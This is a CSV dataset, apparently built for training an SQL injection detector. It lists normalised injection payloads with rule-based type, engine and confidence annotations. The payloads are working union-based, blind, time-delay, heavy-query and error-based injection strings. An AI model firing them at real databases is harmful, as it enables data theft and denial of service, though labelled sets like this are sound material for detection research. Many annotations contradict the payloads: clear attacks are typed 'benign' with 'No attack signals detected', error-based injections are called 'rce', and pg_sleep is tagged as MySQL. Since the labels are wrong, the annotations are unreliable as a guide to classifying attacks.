row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5590,-2233' or ( 1807 = 7274 ) *7274,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5591,"1%' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5592,"1%' ) or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( '%' = '",1,,rce,mysql,0.95,0x7171706a71 detected — rce injection (priority 1) on mysql,rule-based
5593,1' ) where 5279 = 5279 or sleep ( 5 ) #,1,,time_blind,mysql,0.95,"sleep (, or sleep is MySQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5594,select sleep ( 5 ) and ( ( ( 'qjsc' = 'qjsc,1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5595,1%' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and '%' = ',1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5596,"-2857%' ) ) ) union all select 7167,7167,7167,7167,7167,7167,7167,7167#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5597,"1"" where 5845 = 5845 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users detected — heavy_query injection (priority 6) on generic",rule-based
5598,1 ) as jtfx where 8038 = 8038,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5599,"-4699 ) as mymz where 3405 = 3405 or elt ( 1032 = 1032,3623 ) --",1,,boolean_blind,generic,0.95,3405 = 3405 or detected — boolean_blind injection (priority 8) on generic,rule-based
5600,"1' ) ) ) and 8635 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
5601,"1%"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5602,"1'|| ( select 'xbvz' from dual where 1632 = 1632 union all select null,null,null,null,null,null,null,null--",1,,union_based,oracle,0.95,"union all select, union all select detected — union_based injection (priority 7) on oracle",rule-based
5603,"1 ) ) as spdf where 8554 = 8554 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",1,,boolean_blind,generic,0.95,8554 = 8554 or detected — boolean_blind injection (priority 8) on generic,rule-based
5604,1'|| ( select 'ylio' from dual where 3767 = 3767 and 3715 in ( ( char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 3715 = 3715 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) ) ||',1,,boolean_blind,oracle,0.95,3767 = 3767 and detected — boolean_blind injection (priority 8) on oracle,rule-based
5605,"-9160' ) union all select 8148,8148,8148,8148,8148,8148,8148,8148,8148,8148#",1,,union_based,generic,0.95,"union all select, union all select detected — union_based injection (priority 7) on generic",rule-based
5606,"1"" and 2716 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
5607,"-5972"" or 8509 = 3448#",1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5608,"1 or 4915 = ( select count ( * ) from domain.domains as t1,domain.columns as t2,domain.tables as t3 ) --",1,,heavy_query,generic,0.95,"select count ( * ) from domain.domains as t1,domain.columns as t2,domain detected — heavy_query injection (priority 6) on generic",rule-based
5609,"1' ) ) ) or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select ( elt ( 1297 = 1297,1 ) ) ) ,0x717a767a71 ) ) and ( ( ( 'ccqs' = 'ccqs",1,,rce,generic,0.95,0x7171706a71 detected — rce injection (priority 1) on generic,rule-based
